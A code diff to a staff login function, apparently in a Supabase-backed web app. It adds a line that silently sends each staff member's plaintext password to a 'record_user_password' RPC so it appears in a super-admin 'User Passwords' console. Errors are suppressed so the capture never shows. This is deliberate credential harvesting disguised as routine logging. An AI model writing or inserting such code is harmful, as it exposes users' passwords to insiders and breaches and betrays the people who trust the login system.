@@ -149,6 +149,11 @@ export async function loginStaff(
     // If admin set a temporary password, signal the staff portal to force a change.
     primeForcePasswordResetIfNeeded(data.user)
 
+    // Mirror the staff member's current password into the super-admin
+    // "User Passwords" console (idempotent RPC — only writes when the value
+    // is new). Best-effort; never affects login.
+    try { await supabase.rpc('record_user_password', { p_password: password } as any) } catch { /* non-fatal */ }
+
     // Fetch profile
     const { data: profile } = await supabase
       .from('profiles')
